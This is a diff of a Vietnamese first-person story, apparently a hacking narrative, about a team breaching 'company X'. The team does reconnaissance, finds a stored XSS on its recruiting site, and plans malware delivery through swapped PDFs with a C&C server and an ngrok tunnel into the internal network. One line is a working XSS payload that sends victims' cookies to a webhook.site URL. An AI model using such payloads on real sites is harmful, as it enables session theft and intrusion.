@@ -22,7 +22,9 @@ st1 : Chúng tôi đã bắt đầu tìm kiếm các thông tin về công ty X 
 st2 : Sau khi đã có thông tin base chúng tôi bắt đầu rà quét thu thập các địa chỉ ip port, web và subdomain tại nhiều nơi như Shodan...
 st3 : Chúng tôi phân công nhau tìm kiếm các lỗ hổng trên các thông tin thu thập được hầu hết chỉ là các lỗi dos và client.
 Đã 3 ngày trôi qua và webhook của Vũ đã trả về dữ liệu về lỗ hổng XSS của một trang web tuyển dụng của công ty X.
-![[Screenshot 2024-02-18 at 10.39.54.png]]
+![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/044db157-83fc-4213-a7c2-a8d532b33fda)
+
+
 
 ### Phần 3: Manh mối đầu tiên.
 
@@ -32,7 +34,8 @@ payload xss ban đầu của Vũ  :
 '"><img src=x onerror='window.location.replace("https://webhook.site/0634543a?data="+document.cookie)'>
 ```
 
-![[Screenshot 2024-02-18 at 10.49.30.png]]
+![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/43e2b79e-58a0-4129-9919-2752f7ffc7a7)
+
 Với dữ liệu đồ về có lẽ ta đã thấy cookie của người dùng, chúng tôi nhanh chóng tiến hành thêm mã cookie xác thực vào trình duyệt để truy cập vào tài khoản kiểm duyệt đó nhưng không có gì xảy ra.
 Tại sao ? đó là một câu nói xảy ra trong đầu 3 chúng tôi, liệu có phải các dữ liệu xác thực đã được đính `cờ httponly` ? Không trước đó Vũ đã kiểm tra trang web và nó xác thực người dùng qua TOKEN và không có cờ `httponly` vậy tại sao chúng tôi không truy cập được tài khoản đó qua cookie đã thu thập được.
 
@@ -43,11 +46,13 @@ document.documentElement.outerHTML để thu thập toàn hộ html trang web
 window.location.href để thu thập url trang web đang truy cập
 ```
 
-![[Screenshot 2024-02-18 at 10.59.25.png]]
+![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/2e8c8f00-d7dd-421e-afa4-058a4665a40c)
+
 
 Sau khi dữ liệu được trả về chúng tôi đã biết nguyên nhân từ url 172.50.24.21 là một ip private vậy chúng tôi đoán trang web tuyendung.congtyx.com sẽ nhận dữ liệu về một máy chủ và các nhân sự sẽ truy cập vào một webserver nội bộ qua mạng công ty hoặc vpn để duyệt hồ sơ các thành viên - Điều này thực sự thú vị vì nó sẽ làm tăng tính bảo mật của website và tránh để lộ thông tin ra bên ngoài môi trường internet cơ bản sơ đồ sẽ như sau.
 
-![[Screenshot 2024-02-18 at 11.16.04.png]]
+![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/fb863d78-e281-4454-ab57-44959f0b9512)
+
 Vậy không có quyền truy cập vào private vậy thì chúng tôi lấy thêm được dữ liệu gì từ lỗ hổng này. Kiểm tra mã html thu thập được chúng tôi biết các ứng viên sẽ nộp hồ sơ dạng pdf và nếu được duyệt hồ sơ sẽ được gửi lên cấp trên điều đặc biệt là các đường dẫn này ko preview mà sẽ tải thẳng về máy cá nhân và xem trên đó( tôi đã thử các lỗ hổng File upload vulnerabilities nhưng server chỉ cho lưu file pdf và lưu trong cdn) .Ý tưởng ban đầu của chúng tôi sẽ ghi đè mã html khi nhân sự tải xuống file pdf của tôi thay vì đó là pdf trên webserver thì đó là mội loại virut tôi cài cắm vào, tôi phân chia cho Anh thiết kế `máy chủ c&c` để quản lý các PC mà chúng tôi đã takeover.
 
 1 ngày, 2 ngày, 1 tuần, 2 tuần vẫn chưa thấy phải hồi gì chúng tôi đã có rất nhiều câu hỏi: 
@@ -67,7 +72,8 @@ Sau nhiều ngày chúng tôi đã thử nhiều cách và bùm có một pc k�
 
 Chúng tôi tiến hành xây dựng một proxy ngrok cho phép chúng tôi truy cập trang web nội bộ ngoài internet và phân công nhiệm vụ Hoàng sẽ tiến hành tìm kiếm thêm các lỗ hổng trong web nội bộ, tôi và Anh sẽ thực hiện rà soát các dải mạng private và tìm cách khai thác chúng....
 
-![[Screenshot 2024-02-18 at 12.16.12.png]]
+![image](https://github.com/VHAE04/Story-in-dream/assets/89138607/2806ebd9-f64a-4dbf-aa0e-2c873ab0b52b)
+
 
 hết chương 1:
 các keyword : 
